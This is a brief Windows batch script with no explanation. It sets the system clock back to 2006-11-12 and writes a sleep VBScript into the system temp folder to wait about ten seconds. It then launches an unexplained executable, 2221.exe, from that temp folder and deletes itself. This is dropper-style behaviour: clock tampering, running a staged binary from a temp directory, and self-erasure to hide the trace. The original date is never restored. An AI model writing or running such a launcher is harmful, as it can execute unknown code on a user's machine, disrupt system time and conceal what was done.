 
@echo off & setlocal enableextensions

set last_date=%%date:~0,10%

date 2006-11-12

echo WScript.Sleep 1000 > %systemroot%/temp/kuku.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %systemroot%/temp/kuku.vbs
goto Timeout

:Next
%systemroot%/temp/2221.exe


del %0